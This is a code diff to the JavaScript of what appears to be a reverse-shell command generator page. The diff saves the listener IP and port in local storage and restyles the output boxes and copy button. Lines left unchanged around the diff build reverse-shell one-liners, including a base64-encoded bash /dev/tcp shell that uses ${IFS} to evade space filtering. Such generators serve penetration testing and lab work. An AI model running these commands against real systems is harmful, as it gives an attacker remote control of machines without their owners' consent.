@@ -3,6 +3,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const portInput = document.getElementById('port');
     const generatedCommandsContainer = document.getElementById('generatedCommands');
 
+    // Load saved values from local storage
+    const savedIp = localStorage.getItem('reverseShellIp');
+    const savedPort = localStorage.getItem('reverseShellPort');
+
+    if (savedIp) {
+        ipAddressInput.value = savedIp;
+    }
+    if (savedPort) {
+        portInput.value = savedPort;
+    }
+
     const shellCommands = [
         { type: 'bash', name: 'Bash TCP' },
         { type: 'nc', name: 'Netcat' },
@@ -26,6 +37,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const generateAllShellCommands = () => {
         const ip = ipAddressInput.value.trim();
         const port = portInput.value.trim();
+
+        // Save values to local storage
+        localStorage.setItem('reverseShellIp', ip);
+        localStorage.setItem('reverseShellPort', port);
 
         generatedCommandsContainer.innerHTML = ''; // Clear previous commands
 
@@ -54,19 +69,23 @@ document.addEventListener('DOMContentLoaded', () => {
                     break;
                 case 'bash_base64_no_spaces':
                     const bashCmdNoSpaces = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-                    //replace spaces with ${IFS}
                     command = `echo ${btoa(bashCmdNoSpaces)}|base64 -d|bash`.replace(/ /g, '${IFS}');
                     break;
             }
 
             const commandDiv = document.createElement('div');
-            commandDiv.className = 'bg-gray-800 p-4 rounded-md relative border border-red-600';
+            commandDiv.className = 'bg-gray-800 bg-opacity-75 p-4 relative border border-green-500';
             const textareaId = `command-${shell.type}`;
             commandDiv.innerHTML = `
-                <label class="block text-sm font-bold mb-2 text-red-500">${shell.name}:</label>
-                <textarea id="${textareaId}" rows="3" readonly class="shadow appearance-none border border-gray-700 rounded w-full py-2 px-3 text-gray-100 bg-gray-900 leading-tight focus:outline-none focus:shadow-outline font-mono text-sm"></textarea>
-                <button class="copy-btn absolute top-4 right-4 bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs">
-                    Copy
+                <label class="block text-sm font-bold mb-2 text-green-400">${shell.name}:</label>
+                <textarea id="${textareaId}" rows="3" readonly class="shadow appearance-none border border-green-700 w-full py-2 px-3 text-green-200 bg-black leading-tight focus:outline-none focus:shadow-outline font-mono text-sm"></textarea>
+                <button class="copy-btn absolute top-4 right-4 text-gray-400 hover:text-white">
+                    <svg class="copy-icon w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                    </svg>
+                    <svg class="check-icon w-6 h-6 text-green-500 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+                    </svg>
                 </button>
             `;
             generatedCommandsContainer.appendChild(commandDiv);
@@ -74,22 +93,26 @@ document.addEventListener('DOMContentLoaded', () => {
             typeText(textarea, command);
         });
 
-        // Add event listeners for copy buttons
         document.querySelectorAll('.copy-btn').forEach(button => {
+            const copyIcon = button.querySelector('.copy-icon');
+            const checkIcon = button.querySelector('.check-icon');
+
             button.addEventListener('click', (event) => {
-                const textarea = event.target.previousElementSibling;
+                const textarea = event.currentTarget.previousElementSibling;
                 textarea.select();
                 textarea.setSelectionRange(0, 99999); // For mobile devices
 
                 try {
                     document.execCommand('copy');
-                    button.textContent = 'Copied!';
+                    copyIcon.classList.add('hidden');
+                    checkIcon.classList.remove('hidden');
+
                     setTimeout(() => {
-                        button.textContent = 'Copy';
+                        copyIcon.classList.remove('hidden');
+                        checkIcon.classList.add('hidden');
                     }, 2000);
                 } catch (err) {
                     console.error('Failed to copy: ', err);
-                    button.textContent = 'Failed!';
                 }
             });
         });
